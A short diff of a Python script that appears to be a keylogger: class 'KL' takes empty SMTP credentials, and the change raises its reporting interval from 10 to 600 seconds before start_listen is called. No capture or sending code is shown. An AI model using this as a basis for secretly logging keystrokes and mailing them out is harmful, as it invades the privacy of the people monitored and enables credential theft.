@@ -102,5 +102,5 @@ class KL(object):
 
 
 if __name__ == '__main__':
-	logger = KL(interval=10, smtp_username='', smtp_password='')
+	logger = KL(interval=600, smtp_username='', smtp_password='')
 	logger.start_listen()
